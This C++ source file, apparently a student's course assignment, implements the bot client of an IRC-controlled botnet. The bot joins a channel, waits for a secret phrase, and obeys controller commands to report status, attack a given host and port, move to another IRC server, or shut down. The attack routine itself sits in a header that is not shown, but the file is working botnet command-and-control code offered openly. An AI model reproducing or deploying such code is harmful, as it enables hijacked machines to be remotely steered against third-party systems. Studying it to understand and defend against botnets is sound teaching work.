// File: bot.cpp
// Desc: Handles Bot logic for BotNet.
//			Listens for commands given with a secret phrase and parses valid commands.
// Written by: James Cote
// ID: 10146559
// Tutorial: T01

// Includes
#include "connection.h"

// Namespace
using namespace std;

// Global
connection* pConnection;

// Defines
#define NUM_ARGS 5
#define NUM_MOVE_ARGS 3
#define NUM_ATK_ARGS 2
#define HOSTNAME_ARG 1
#define PORT_ARG 2
#define CHANNEL_ARG 3
#define PHRASE_ARG 4
#define MAX_BUFFER_SIZE 256

// Message Identifiers
const char sPRIVATEMSG[] = { "PRIVMSG" };
const char sATTACK[] = { "attack" };
const char sSTATUS[] = { "status" };
const char sMOVE[] = { "move" };
const char sSHUTDOWN[] = { "shutdown" };
const char sPREFIX[] = { "bot" };

// Function Declarations
bool handleMessage( const string& sMsg, const string& sPhrase );
void handleMove( const string& sHostName, int iPort, 
				 const string& sChannel, const string& sControllerName );
bool handleCommand( const string& sCommandString, string sControllerName );

// Main
int main( int iArgC, char* pArgs[] )
{
	// Local Variables
	int iPort;
	string sPhrase, sHostName, sChannel;
	bool bShutdown = false;
	string sMessage;
	int iBytesRead = 0;

	// Check Arguments
	if ( iArgC < NUM_ARGS )
	{
		cout << "Not enough arguments: ./bot <hostname> <port> <channelname> <secret-phrase>\n";
		return 1;
	}

	// Grab Arguments
	iPort = atoi( pArgs[ PORT_ARG ] );
	sPhrase.assign( pArgs[ PHRASE_ARG ] );
	sHostName.assign( pArgs[ HOSTNAME_ARG ] );
	sChannel.assign( pArgs[ CHANNEL_ARG ] );

	// init input handler.
	pConnection = new connection( sHostName, iPort, sChannel, sMessage );

	// Established socket
	if ( pConnection->isConnected() )
	{
		// Connect to IRC server (using IRC protocol)
		pConnection->connectToServer( sPREFIX );

		// Loop goes here.
		while ( !bShutdown )
		{
			// Read Message from the Server and store in String
			iBytesRead = pConnection->getNextLine( sMessage );

			if ( iBytesRead > 0 )
			{
				// Handle the Message.
				bShutdown = handleMessage( sMessage, sPhrase );
			}
		}
	}

	// Clean up
	delete pConnection;

	return 1;
}

// Parse Message, only handle if message was to the channel and secret phrase is found.
bool handleMessage( const string& sMsg, const string& sPhrase )
{
	// Local Variables
	bool bReturnValue = false;
	vector< string > sSplitMsgs;
	vector< string > sMessageDefs;
	
	// Break up and check Message Parameters
	pConnection->splitString( sMsg, ':', sSplitMsgs );
	pConnection->splitString( sSplitMsgs[ 0 ], ' ', sMessageDefs );

	// General Message received? check for Secret Phrase and handle command if any
	if ( !sMessageDefs[ 1 ].compare( sPRIVATEMSG ) && '#' == sMessageDefs[ 2 ][ 0 ] )	// Handle Potential Message
		if ( string::npos != sSplitMsgs[ 1 ].find( sPhrase ) )							// Was the Secret Phrase found?
			bReturnValue = handleCommand( sSplitMsgs[ 1 ], sSplitMsgs[ 0 ].substr( 0, sSplitMsgs[ 0 ].find_first_of( '!' ) ) /*Controller Name*/ );
	
	return bReturnValue;
}

// Handle the command if plausibly valid command
bool handleCommand( const string& sCommandString, string sControllerName )
{
	// Local Variables
	bool bReturnValue = false;
	int iPort;
	char* p;
	vector< string > sSplitCommand;
	
	// Split up command line arguments.
	pConnection->splitString( sCommandString, ' ', sSplitCommand );

	// Move through to list of message variables to find a command.
	for ( vector< string >::iterator iter = sSplitCommand.begin();
		  iter != sSplitCommand.end();
		  ++iter )
	{
		if ( !iter->compare( sSTATUS ) )														// Handle Status
		{
			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : Bot\n" );
			break;
		}
		else if ( !iter->compare( sATTACK )  )	// Handle Attack
		{
			// Check that number of arguments is correct.
			if ( (iter + NUM_ATK_ARGS != sSplitCommand.end()) )
			{
				// Check that Port is a valid input
				iPort = (int) strtol( (iter + 2)->c_str(), &p, 10 );

				// Is it a valid input?
				if ( 0 == *p )
					pConnection->attack( *(iter + 1), iPort, sControllerName );
				else
					pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : attack failed, invalid port\r\n" );
			}
			else // Not enough Arguments; report failure.
				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : attack failed, invalid number of arguments\r\n" );
			break;
		}
		else if ( !iter->compare( sMOVE ) )	// Handle Move
		{
			// Check Number of Arguments
			if ( (iter + NUM_MOVE_ARGS != sSplitCommand.end()) )
			{
				// Verify Port is valid input.
				iPort = (int) strtol( (iter + 2)->c_str(), &p, 10 );

				// Was it valid?
				if ( 0 == *p )
					handleMove( *(iter + 1), iPort, *(iter + 3), sControllerName );
				else
					pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : move failed, invalid port\r\n" );
			}
			else // Wrong number of arguments? Respond with failure.
				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : move failed, invalid number of parameters\r\n" );
			break;
		}
		else if ( !iter->compare( sSHUTDOWN ) )													// Handle Shutdown
		{
			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " : success\r\n" );
			bReturnValue = true;
			break;
		}
	}

	return bReturnValue;
}

// Handle Move command from server.
void handleMove( const string& sHostName, int iPort, const string& sChannel, const string& sName )
{
	// Local Variables - try to set up the new connection
	string sErrMsg;
	connection* pNewConnection = new connection( sHostName, iPort, sChannel, sErrMsg );

	// Connection was successful?
	if ( pNewConnection->isConnected() )
	{
		// Send success message and switch connection to new connection
		pNewConnection->connectToServer( sPREFIX );
		pConnection->Socket_Write( "PRIVMSG " + sName + " : success\r\n" );
		delete pConnection;
		pConnection = pNewConnection;
	}
	else
	{
		// delete failed connection and send failure message.
		delete pNewConnection;
		pConnection->Socket_Write( "PRIVMSG " + sName + " : failure, " + sErrMsg + "\r\n" );
	}
}